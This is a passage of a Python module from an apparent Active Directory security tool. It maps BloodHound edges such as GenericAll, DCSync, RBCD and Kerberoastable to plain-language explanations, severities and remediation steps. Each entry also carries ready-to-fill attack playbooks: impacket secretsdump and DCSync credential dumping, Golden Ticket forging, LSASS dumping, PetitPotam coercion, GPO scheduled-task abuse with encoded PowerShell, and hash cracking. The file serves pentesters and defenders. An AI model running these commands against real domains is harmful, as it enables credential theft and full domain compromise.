#!/usr/bin/env python3
"""
intelligence.py — The "Explain It Like I'm 5" (ELI5) layer + actionable blueprints.

For every dangerous ACL right / BloodHound edge type this tool detects, we
ship three pieces of educational intelligence:

1. **`eli5`** — a plain-English explanation of what the permission means,
   why it is dangerous, and how a defender should remediate it.  Written
   so a junior pentester or junior blue-teamer can grok it in 30 seconds.

2. **`severity`** — coarse risk band (CRITICAL / HIGH / MEDIUM / LOW).

3. **`playbooks`** — concrete tool command templates with placeholders like
   `<TARGET_IP>`, `<DOMAIN_USER>`, `<DOMAIN>` so an operator can copy/paste
   and just fill in the blanks.

Adding a new attack primitive is one entry in `EDGE_INTELLIGENCE` plus an
optional playbook entry — no other code changes required.
"""

from __future__ import annotations

from typing import Dict, List

from .theme import Severity


# ═══════════════════════════════════════════════════════════════════════════════
# EDGE INTELLIGENCE CATALOG
# ═══════════════════════════════════════════════════════════════════════════════
EDGE_INTELLIGENCE: Dict[str, Dict] = {
    # ── ACL rights ──────────────────────────────────────────────────────────
    "GenericAll": {
        "severity": Severity.CRITICAL,
        "short": "Full control of the target object",
        "eli5": (
            "GENERICALL means you have *every* permission on the target. Reset its "
            "password, add it to a group, change its SPN, set its msDS-KeyCredentialLink, "
            "modify its security descriptor — anything you want. On a user that means "
            "instant account takeover. On a group it means you can add yourself as a "
            "member and inherit every privilege the group grants. On a computer it "
            "means full RBCD / Shadow Credentials / local-admin territory. From a "
            "defender's view: this ACL almost never needs to exist on a regular "
            "principal. Audit who has it, remove it, and replace with the minimum "
            "set of property-write rights the business actually needs. Track changes "
            "via SACL 5136 (Directory Service Access) events."
        ),
        "playbooks": {
            "user": [
                "impacket-changepasswd <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST> -newpass '<NEW_PASSWORD>'",
                "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_USER>' -dc-ip <DC_IP>",
                "net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <TARGET_HOST>",
            ],
            "group": [
                "net rpc group addmem '<TARGET_GROUP>' '<DOMAIN_USER>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
                "impacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -method LDAPS -computer-name '<NEW_HOST>$' -computer-pass '<NEW_PASS>'",
                "PowerView: Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<DOMAIN_USER>' -Credential $cred",
            ],
            "computer": [
                "rbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from '<CONTROLLED_HOST>$' -action write",
                "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_HOST>$' -dc-ip <DC_IP>",
                "impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
            ],
        },
        "remediation": (
            "Remove GenericAll from non-owner principals. Use managed service accounts "
            "(gMSA) for services that need write access. Audit with 'Get-ACL' / "
            "BloodHound 'Find-PrincipalsWithRight' queries."
        ),
    },

    "GenericWrite": {
        "severity": Severity.CRITICAL,
        "short": "Write any attribute on the target object",
        "eli5": (
            "GENERICWRITE lets you modify *any* attribute on the target. Two of those "
            "attributes are immediately dangerous: `servicePrincipalName` (set it to "
            "kick off Kerberoasting against the target account) and `msDS-KeyCredentialLink` "
            "(set it to perform Shadow Credentials). On a computer you can also rewrite "
            "the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for RBCD. Defenders: "
            "this right is handed out way too liberally — review every delegation and "
            "tighten to property-specific writes (e.g. write-self on `Personal Information`)."
        ),
        "playbooks": {
            "user": [
                "# Kerberoast via SPN set\nimpacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP>",
                "# Shadow Credentials\nwhisker.py add /target:<TARGET_USER> /domain:<DOMAIN> /dc:<DC_HOST> /user:<DOMAIN_USER> /password:<PASSWORD>",
                "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_USER>' -dc-ip <DC_IP>",
            ],
            "computer": [
                "# RBCD\nrbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from '<CONTROLLED_HOST>$' -action write",
                "# Then request S4U2Self/S4U2Proxy\nimpacket-getST <DOMAIN>/<CONTROLLED_HOST>$:<PASSWORD> -spn 'cifs/<TARGET_HOST>' -impersonate administrator -dc-ip <DC_IP>",
            ],
        },
        "remediation": (
            "Replace GenericWrite with property-specific ACEs. Monitor for writes to "
            "servicePrincipalName (Event 4742) and msDS-KeyCredentialLink (Event 5136)."
        ),
    },

    "WriteDacl": {
        "severity": Severity.CRITICAL,
        "short": "Modify the target's security descriptor",
        "eli5": (
            "WRITEDACL lets you rewrite the ACL on the target. The trivial abuse is "
            "to grant yourself GenericAll on the target, then abuse that. It is a "
            "two-step takeover but the second step is free. Defenders: ACLs are "
            "themselves security state — only Domain Admins / the object's owner "
            "should hold WriteDacl. Watch SACL event 4670 (permissions change) on "
            "sensitive objects."
        ),
        "playbooks": {
            "user": [
                "# Step 1 — grant yourself GenericAll\nimpacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights FullControl -principal '<DOMAIN_USER>' -target '<TARGET_USER>' -dc-ip <DC_IP>",
                "# Step 2 — abuse the new right (e.g. reset password)\nnet rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
            ],
            "group": [
                "impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights WriteMembers -principal '<DOMAIN_USER>' -target '<TARGET_GROUP>' -dc-ip <DC_IP>",
            ],
        },
        "remediation": (
            "Restrict WriteDacl to administrators. Alert on any ACL modification to "
            "Tier-0 objects (Event 4670, 5136, 4907)."
        ),
    },

    "WriteOwner": {
        "severity": Severity.CRITICAL,
        "short": "Change the owner of the target object",
        "eli5": (
            "WRITEOWNER lets you take ownership of the target. Once you own it, you "
            "implicitly have WriteDacl, which means you can grant yourself GenericAll. "
            "It is therefore equivalent to full control in two steps. Defenders: only "
            "Domain Admins / BUILTIN\\Administrators should be able to take ownership "
            "of sensitive principals. Track Event 4670 / 5136 for owner changes."
        ),
        "playbooks": {
            "user": [
                "# Take ownership, then grant FullControl\nimpacket-owneredit.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -new-owner '<DOMAIN_USER>' -target '<TARGET_USER>' -dc-ip <DC_IP>",
                "impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights FullControl -principal '<DOMAIN_USER>' -target '<TARGET_USER>' -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Same as WriteDacl — restrict to Tier-0 admins only.",
    },

    "Owns": {
        "severity": Severity.CRITICAL,
        "short": "You already own the object",
        "eli5": (
            "OWNS means you are the Owner of the object's security descriptor. Owners "
            "implicitly have the right to grant themselves any permission. Abuse is "
            "identical to WriteOwner: grant yourself GenericAll, then take over."
        ),
        "playbooks": {
            "user": [
                "impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights FullControl -principal '<DOMAIN_USER>' -target '<TARGET_USER>' -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Audit owner fields. Sensitive objects should be owned by DA / Enterprise Admins.",
    },

    "AddMember": {
        "severity": Severity.CRITICAL,
        "short": "Add members to a group",
        "eli5": (
            "ADDMEMBER lets you add any principal to the target group. If the group is "
            "privileged (e.g. Server Operators), you can add yourself and inherit those "
            "privileges immediately. The classic privilege-escalation primitive."
        ),
        "playbooks": {
            "group": [
                "net rpc group addmem '<TARGET_GROUP>' '<DOMAIN_USER>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
                "PowerView: Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<DOMAIN_USER>'",
                "impacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -computer-name '<NEW_HOST>$' -computer-pass '<NEW_PASS>'   # then add the new computer to the group",
            ],
        },
        "remediation": (
            "Restrict who can add members to privileged groups. Use Restricted Groups "
            "GPO or 'Privileged Access Management' features in AD. Audit Event 4728 "
            "(global group member add) and 4732 (local group)."
        ),
    },

    "ForceChangePassword": {
        "severity": Severity.CRITICAL,
        "short": "Reset the target user's password without knowing the current one",
        "eli5": (
            "FORCECHANGEPASSWORD lets you reset a user's password without supplying "
            "their current password. The simplest, lowest-detect account takeover. "
            "On the defender side: this right comes from the 'Reset Password' extended "
            "permission; review who has it on every user, and especially on Tier-0 "
            "principals. Alert on Event 4724 (password reset by another user)."
        ),
        "playbooks": {
            "user": [
                "net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
                "impacket-changepasswd <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -newpass '<NEW_PASSWORD>' -user '<TARGET_USER>'",
                "PowerShell: Set-ADAccountPassword -Identity <TARGET_USER> -NewPassword (ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force)",
            ],
        },
        "remediation": (
            "Audit 'Reset Password' extended right on user objects. Alert on Event "
            "4724. Implement PAW (Privileged Access Workstations) for resets of "
            "Tier-0 accounts."
        ),
    },

    "AllExtendedRights": {
        "severity": Severity.HIGH,
        "short": "All extended permissions on the target",
        "eli5": (
            "ALLEXTENDEDRIGHTS is a bag of every extended right on the target. On a "
            "user it grants ForceChangePassword. On a computer it grants "
            "ReadLAPSPassword (if LAPS is in use). On a domain it grants DCSync. "
            "Dangerous because it bundles many sub-rights into one ACE."
        ),
        "playbooks": {
            "user": [
                "net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
            ],
            "computer": [
                "python3 pyLAPS.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -t '<TARGET_HOST>'",
                "Get-AdmPwdPassword -ComputerName <TARGET_HOST>   # Microsoft LAPS",
            ],
        },
        "remediation": "Replace with the specific extended right the business actually needs.",
    },

    "AddKeyCredentialLink": {
        "severity": Severity.CRITICAL,
        "short": "Shadow Credentials primitive",
        "eli5": (
            "ADDKEYCREDENTIALLINK lets you write the `msDS-KeyCredentialLink` "
            "attribute on the target. Once written, you can authenticate as the "
            "target using a certificate (PKINIT). This gives you the target's NT "
            "hash and TGT *without* touching their password — extremely stealthy, "
            "and one of the most under-utilised takeover paths. Defenders: monitor "
            "Event 5136 for writes to `msDS-KeyCredentialLink`. On 2016+ DCs "
            "enable 'Audit Authentication' for Kerberos PKINIT events."
        ),
        "playbooks": {
            "user": [
                "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_USER>' -dc-ip <DC_IP>",
                "whisker.py add /target:<TARGET_USER> /domain:<DOMAIN> /dc:<DC_HOST> /user:<DOMAIN_USER> /password:<PASSWORD>",
                "# Whisker will print a PFX; use it to auth:\nRubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_PFX> /password:<PFX_PASS> /domain:<DOMAIN> /dc:<DC_HOST> /ptt",
            ],
            "computer": [
                "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_HOST>$' -dc-ip <DC_IP>",
            ],
        },
        "remediation": (
            "Block GenericWrite/AllExtendedRights on sensitive principals. "
            "Monitor 5136 / 4742 for msDS-KeyCredentialLink modifications. "
            "If you don't use WHfB, consider blocking the attribute."
        ),
    },

    "ReadLAPSPassword": {
        "severity": Severity.HIGH,
        "short": "Read the LAPS-managed local admin password",
        "eli5": (
            "READLAPSPASSWORD lets you read the local administrator password that "
            "LAPS rotates on the target computer. With the password you can pivot to "
            "the box as a local admin. Microsoft LAPS (legacy) stores it in "
            "`ms-Mcs-AdmPwd`; Windows LAPS (2022+) stores it in "
            "`msLAPS-Password`. Both are exposed via the same BloodHound edge."
        ),
        "playbooks": {
            "computer": [
                "# Microsoft LAPS (legacy)\nGet-AdmPwdPassword -ComputerName <TARGET_HOST>",
                "# Windows LAPS (new)\nGet-LapsADPassword -Identity <TARGET_HOST>",
                "# Python\npython3 pyLAPS.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -t '<TARGET_HOST>'",
                "# Then PSExec / WinRM with the recovered password\nimpacket-psexec '<DOMAIN>/<LOCAL_ADMIN>:<LAPS_PASS>@<TARGET_HOST>'",
            ],
        },
        "remediation": (
            "Restrict LAPS read rights to a dedicated help-desk group. Consider "
            "Windows LAPS with Entra-backed password decryption. Audit reads "
            "via SACL on `ms-Mcs-AdmPwd` / `msLAPS-Password`."
        ),
    },

    "DCSync": {
        "severity": Severity.CRITICAL,
        "short": "Replicate directory secrets like a Domain Controller",
        "eli5": (
            "DCSYNC means you hold the 'DS-Replication-Get-Changes' and "
            "'DS-Replication-Get-Changes-All' extended rights on the domain — the "
            "same rights a Domain Controller has. With them you can ask the DC for "
            "ANY secret in the directory: every user's NT hash, every computer "
            "account hash, krbtgt, and trust keys. It is the gold standard of "
            "domain compromise. Once you have krbtgt you can forge Golden Tickets "
            "for persistence that survives password resets."
        ),
        "playbooks": {
            "domain": [
                "impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> -just-dc-ntlm",
                "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
                "certipy auth -u '<DOMAIN_USER>' -p '<PASSWORD>' -dc-ip <DC_IP>   # if cert-based",
                "# Forge a Golden Ticket with krbtgt hash\nimpacket-ticketer -nthash <KRBTGT_HASH> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -user-id 500 administrator",
                "export KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<DC_HOST> -k -no-pass",
            ],
        },
        "remediation": (
            "DCSync rights come from being a member of 'Domain Admins', "
            "'Enterprise Admins', or being granted the replication ACEs explicitly. "
            "Audit who has these ACEs on the domain head — should only be DCs and "
            "DA. Monitor for DSReplication events (4662 with the replication GUIDs)."
        ),
    },

    "CanRBCD": {
        "severity": Severity.CRITICAL,
        "short": "Resource-Based Constrained Delegation primitive",
        "eli5": (
            "CANRBCD means you can edit the target's "
            "`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Combined with "
            "control of any computer account (you can create one with "
            "MAQ=1 by default), you can impersonate ANY user (including a DA) "
            "to ANY service on the target. Frequently abused because it's almost "
            "always enabled on workstations where Authenticated Users have "
            "GenericWrite."
        ),
        "playbooks": {
            "computer": [
                "# 1. Create a new computer account (or use one you control)\nimpacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -computer-name 'EVIL$' -computer-pass '<EVIL_PASS>'",
                "# 2. Configure RBCD on the target\nrbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from 'EVIL$' -action write",
                "# 3. Request a service ticket impersonating a DA\nimpacket-getST <DOMAIN>/EVIL$:'<EVIL_PASS>' -spn 'cifs/<TARGET_HOST>' -impersonate administrator -dc-ip <DC_IP>",
                "# 4. Use the ticket\nexport KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<TARGET_HOST> -k -no-pass",
            ],
        },
        "remediation": (
            "Block GenericWrite by Authenticated Users on computer objects. "
            "Set 'Machine Account Quota' to 0 to prevent random computer account "
            "creation. Monitor 5136 for writes to "
            "`msDS-AllowedToActOnBehalfOfOtherIdentity`."
        ),
    },

    "AllowedToDelegate": {
        "severity": Severity.HIGH,
        "short": "Constrained Delegation primitive",
        "eli5": (
            "ALLOWEDTODELEGATE means the principal (user or computer) is configured "
            "for Constrained Delegation. If you compromise the principal, you can "
            "request service tickets impersonating any user (including DA) for the "
            "specific services listed in `msDS-AllowedToDelegateTo`. With protocol "
            "transition (`TrustedToAuthForDelegation`) you don't even need a user "
            "to be logged in — S4U2Self+S4U2Proxy gives you the impersonation "
            "ticket directly."
        ),
        "playbooks": {
            "user": [
                "# Requires TrustedToAuth (protocol transition)\nimpacket-getST <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -spn '<DELEGATED_SPN>' -impersonate administrator -dc-ip <DC_IP>",
                "export KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<TARGET_HOST> -k -no-pass",
            ],
            "computer": [
                "# If you have the computer's hash\nimpacket-getST <DOMAIN>/<COMPUTER>$ -hashes :<NT_HASH> -spn '<DELEGATED_SPN>' -impersonate administrator -dc-ip <DC_IP>",
            ],
        },
        "remediation": (
            "Migrate to Kerberos Constrained Delegation with Resource-Based mode. "
            "Avoid 'TrustedToAuthForDelegation' (protocol transition). Audit "
            "msDS-AllowedToDelegateTo and msDS-AllowedToActOnBehalfOfOtherIdentity."
        ),
    },

    # ── Edges that grant code execution ──────────────────────────────────────
    "AdminTo": {
        "severity": Severity.HIGH,
        "short": "Local administrator on the target computer",
        "eli5": (
            "ADMINTO means the principal is a local administrator on the target "
            "computer. With local admin you can dump LSASS for credential material, "
            "install persistence, or pivot to other accounts logged in via "
            "HasSession edges. Local admin on a DC = DCSync-equivalent in practice."
        ),
        "playbooks": {
            "computer": [
                "impacket-psexec <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
                "impacket-wmiexec <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
                "evil-winrm -i <TARGET_HOST> -u '<DOMAIN_USER>' -p '<PASSWORD>'",
                "# Post-exploitation\nimpacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
                "lsassy -d <DOMAIN> -u <DOMAIN_USER> -p <PASSWORD> <TARGET_HOST>",
            ],
        },
        "remediation": (
            "Enforce least privilege via LAPS + restricted local admin group. "
            "Disable WMI / WinRM where unused. Use EDR to catch LSASS access."
        ),
    },

    "HasSession": {
        "severity": Severity.HIGH,
        "short": "An active logon session exists on this computer",
        "eli5": (
            "HASSESSION means the user has an active logon session on the computer. "
            "If you compromise the computer (e.g. via AdminTo), you can dump LSASS "
            "and recover that user's NT hash / Kerberos tickets. The classic "
            "lateral-movement to privilege-escalation pivot."
        ),
        "playbooks": {
            "computer": [
                "# After compromising the box\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::tickets /export",
                "lsassy -d <DOMAIN> -u <DOMAIN_USER> -p <PASSWORD> <TARGET_HOST>",
                "nanodump --pid <LSASS_PID> --write lsass.dmp",
            ],
        },
        "remediation": (
            "Tiered admin model — Tier-0 admins never log on to Tier-1/2 boxes. "
            "Protect LSASS (RunAsPPL, EDR, Credential Guard)."
        ),
    },

    "CanPSRemote": {
        "severity": Severity.HIGH,
        "short": "Remote PowerShell access",
        "eli5": (
            "CANPSREMOTE means the principal is in the Remote Management Users "
            "group on the target. With PowerShell remoting you get unattended "
            "code execution, often with the same effective privileges as a local "
            "admin (depends on configuration). Less noisy than psexec."
        ),
        "playbooks": {
            "computer": [
                "evil-winrm -i <TARGET_HOST> -u '<DOMAIN_USER>' -p '<PASSWORD>'",
                "New-PSSession -ComputerName <TARGET_HOST> -Credential $cred",
                "evil-winrm -i <TARGET_HOST> -H <NT_HASH> -u <DOMAIN_USER>   # pass-the-hash",
            ],
        },
        "remediation": "Restrict Remote Management Users group. Disable PSRemoting on workstations. Use JEA.",
    },

    "ExecuteDCOM": {
        "severity": Severity.HIGH,
        "short": "DCOM-based remote execution",
        "eli5": (
            "EXECUTEDCOM means the principal is in the Distributed COM Users group "
            "on the target. DCOM gives you remote code execution via MMC20.Application, "
            "ShellWindows, ShellBrowserWindow, and similar DCOM objects. Stealthier "
            "than psexec — often not detected by legacy EDR."
        ),
        "playbooks": {
            "computer": [
                "impacket-dcomexec <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
                "# SharpMove / Move- lateral techniques via DCOM\nSharpMove.exe --method dcom --target <TARGET_HOST> --username <DOMAIN_USER> --password <PASSWORD>",
            ],
        },
        "remediation": "Restrict Distributed COM Users. Disable DCOM where unused (dcomcnfg).",
    },

    # ── Group / GPO edges ────────────────────────────────────────────────────
    "MemberOf": {
        "severity": Severity.MEDIUM,
        "short": "Direct group membership",
        "eli5": (
            "MEMBEROF means the principal is a direct member of the group. All "
            "rights the group holds are inherited. Nested memberships (groups in "
            "groups) are flattened by this tool's graph layer."
        ),
        "playbooks": {},
        "remediation": "Review group nesting. Avoid deep nesting; document each layer.",
    },

    "GPLink": {
        "severity": Severity.CRITICAL,
        "short": "GPO is linked to an OU",
        "eli5": (
            "GPLINK means the GPO is applied to the OU. If you have write access "
            "to the GPO, you can edit it to push a malicious scheduled task, "
            "logon script, or service — and code execution lands on every computer "
            "in the linked OU on the next GPO refresh (90 minutes by default, "
            "plus/minus 30)."
        ),
        "playbooks": {
            "gpo": [
                "# SharpGPOAbuse — add immediate task\nSharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<DOMAIN>\\\\<DOMAIN_USER>' --Command 'cmd.exe' --Arguments '/c powershell -enc <BASE64>' --GPOName '<GPO_NAME>'",
                "# PowerView\nNew-GPOImmediateTask -TaskName Update -GPODisplayName '<GPO_NAME>' -CommandArguments '/c calc.exe'",
                "# Force GPO refresh on targets (requires local admin)\ngpupdate /force",
            ],
        },
        "remediation": (
            "Restrict who can edit GPOs. Use GPO inheritance blocking on Tier-0 "
            "OUs. Monitor GPO modifications via Event 5136 / 5145."
        ),
    },

    # ── Other dangerous edges ────────────────────────────────────────────────
    "UnconstrainedDelegation": {
        "severity": Severity.CRITICAL,
        "short": "Unconstrained Delegation — TGT capture primitive",
        "eli5": (
            "UNCONSTRAINEDDELEGATION means the computer holds a copy of any user's "
            "TGT that authenticates to it. Coerce a high-privileged user (e.g. a "
            "DC computer account via PetitPotam / PrinterBug) to authenticate to "
            "this box and their TGT lands in LSASS. From there it's a short hop "
            "to DCSync."
        ),
        "playbooks": {
            "computer": [
                "# Coerce DC auth to your unconstrained-delegation box\npython3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <UD_HOST> <DC_IP>",
                "python3 printerbug.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> <UD_HOST>",
                "# On the UD host, dump tickets\nmimikatz # sekurlsa::tickets /export",
                "# Use captured DC$ TGT\nexport KRB5CCNAME=DC.ccache; impacket-secretsdump -k -no-pass <DOMAIN>/DC$@<DC_HOST>",
            ],
        },
        "remediation": (
            "Identify all UD-enabled boxes (`Get-ADComputer -Filter {TrustedForDelegation -eq $true}`). "
            "Disable UD where possible. Enable 'Account is sensitive and cannot be delegated' "
            "on Tier-0 accounts. Patch DCs against PetitPotam (KB5005413)."
        ),
    },

    "Kerberoastable": {
        "severity": Severity.HIGH,
        "short": "User has an SPN — Kerberoastable",
        "eli5": (
            "KERBEROASTABLE means the user has a Service Principal Name (SPN). Any "
            "authenticated user can request a TGS for the SPN, and the TGS is "
            "encrypted with the account's NT hash. Crack the ticket offline with "
            "hashcat (-m 13100 for RC4, -m 19700/19800/19900 for AES). Weak service-"
            "account passwords fall in minutes."
        ),
        "playbooks": {
            "user": [
                "impacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP> -outputfile hashes.txt",
                "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rule=/usr/share/hashcat/rules/best64.rule",
                "# For AES Kerberoasting (-m 19700 / 19800 / 19900):\nRubeus.exe kerberoast /user:<TARGET_USER> /outfile:hashes.txt",
            ],
        },
        "remediation": (
            "Use gMSAs for service accounts (random 120-char passwords, auto-rotated). "
            "If SPN accounts must remain, set 25+ char passwords. Monitor Event "
            "4769 for TGS requests (esp. RC4 / 'Downgrade' encryption type 0x17)."
        ),
    },

    "ASRepRoastable": {
        "severity": Severity.HIGH,
        "short": "Account has DONT_REQ_PREAUTH — AS-REP Roastable",
        "eli5": (
            "ASREPROASTABLE means the account has 'Do not require Kerberos "
            "preauthentication' set. Anyone can send an AS-REQ for this account "
            "and receive an AS-REP that contains material encrypted with the "
            "account's NT hash. Crack offline with hashcat (-m 18200). The "
            "primitive is *unauthenticated* — the attacker doesn't even need a "
            "foothold."
        ),
        "playbooks": {
            "user": [
                "impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile hashes.txt",
                "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
            ],
        },
        "remediation": (
            "Audit 'Do not require Kerberos preauthentication' on every account "
            "and disable it. Exception list should be tiny. Monitor Event 4768 "
            "for AS-REQ without preauth."
        ),
    },

    "SIDHistory": {
        "severity": Severity.MEDIUM,
        "short": "Account carries SID History",
        "eli5": (
            "SIDHISTORY means the account has extra SIDs in its `sIDHistory` "
            "attribute. These SIDs are added to the user's access token at logon. "
            "If a SID from a different (trusted) domain's Domain Admins is in "
            "sIDHistory, the user effectively becomes a Domain Admin across the "
            "trust. Often used for migrations but easily abused if the source "
            "domain is compromised."
        ),
        "playbooks": {
            "user": [
                "# If you control the source domain (forest-trust migration)\n# Forge a ticket with extra SIDs\nimpacket-ticketer -user <DOMAIN_USER> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <KRBTGT_HASH> -extra-sid <TARGET_DOMAIN_SID>-512 administrator",
            ],
        },
        "remediation": (
            "Run `Get-ADUser -LDAPFilter '(sIDHistory=*)'` to inventory. Remove "
            "sIDHistory once migrations complete. Enable SID Filter Quarantine "
            "on all external trusts."
        ),
    },

    "Self-Add to Group Escalation": {
        "severity": Severity.HIGH,
        "short": "Can write membership on a group they are not currently in",
        "eli5": (
            "Self-Add to Group Escalation occurs when an Active Directory user, group, or computer "
            "holds permissions over a group object that allows them to modify its membership. "
            "Since they are not currently a member of this target group, they can abuse this "
            "right to add their own account (or any account they control) to the group. "
            "If the target group is high-value (like Domain Admins, Account Operators, "
            "or Backup Operators), this results in immediate privilege escalation."
        ),
        "playbooks": {
            "group": [
                "net rpc group addmem '<TARGET_GROUP>' '<CONTROLLED_USER>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
                "bloodyAD --host <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' add groupMember '<TARGET_GROUP>' '<CONTROLLED_USER>'",
                "Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_USER>' -Domain <DOMAIN> -Server <DC_HOST>",
                "impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights WriteMembers -principal '<DOMAIN_USER>' -target '<TARGET_GROUP>' -dc-ip <DC_IP>   # if holding WriteDacl/WriteOwner"
            ]
        },
        "remediation": (
            "Remove membership modification rights (WriteProperty for Member attribute, GenericAll, GenericWrite, WriteDacl, WriteOwner) "
            "from non-administrative principals on group objects. Leverage Restricted Groups GPO or Protected Groups in AD. "
            "Audit member additions via Event 4728 (global group change) and 4732 (local group change)."
        )
    },

    "MachineAccountQuota": {
        "severity": Severity.HIGH,
        "short": "Any authenticated user can create computer accounts for RBCD attacks",
        "eli5": (
            "MACHINEACCOUNTQUOTA controls how many computer accounts a regular domain "
            "user is allowed to create. The Windows default is 10. If this quota is > 0, "
            "any user with domain credentials can create a new computer account and use it "
            "as the 'delegate-from' principal in a Resource-Based Constrained Delegation "
            "(RBCD) attack. Combined with GenericWrite on a target computer, this allows "
            "impersonating any user (including Domain Admins) to any service on the target. "
            "Defenders: set ms-DS-MachineAccountQuota to 0 via 'Set-ADDomain' or GPO."
        ),
        "playbooks": {
            "domain": [
                "# 1. Create a fake computer account (MAQ allows this)\\nimpacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -computer-name 'EVIL$' -computer-pass '<NEW_PASSWORD>'",
                "# 2. Set RBCD on target (requires GenericWrite on target)\\nrbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from 'EVIL$' -action write",
                "# 3. Request impersonation ticket\\nimpacket-getST <DOMAIN>/EVIL$:'<NEW_PASSWORD>' -spn 'cifs/<TARGET_HOST>' -impersonate administrator -dc-ip <DC_IP>",
                "# 4. Use the ticket\\nexport KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<TARGET_HOST> -k -no-pass",
            ],
        },
        "remediation": (
            "Set ms-DS-MachineAccountQuota to 0: "
            "Set-ADDomain -Identity <DOMAIN> -Replace @{'ms-DS-MachineAccountQuota'='0'}. "
            "Monitor Event 4741 (computer account created) for unauthorized creations."
        ),
    },

    "ReadGMSAPassword": {
        "severity": Severity.HIGH,
        "short": "Read the auto-managed password of a Group Managed Service Account",
        "eli5": (
            "READGMSAPASSWORD lets you read the msDS-ManagedPassword attribute of a "
            "Group Managed Service Account (gMSA). gMSAs have auto-rotated 240-byte "
            "random passwords that are uncrackable. However, if you can *read* the "
            "password (via this ACE), you can compute the NT hash and authenticate as "
            "the gMSA. Service accounts frequently have elevated privileges — domain "
            "admin equivalent in many environments. Defenders: restrict the "
            "msDS-GroupMSAMembership attribute (PrincipalsAllowedToRetrieveManagedPassword) "
            "to only the specific servers that need it."
        ),
        "playbooks": {
            "user": [
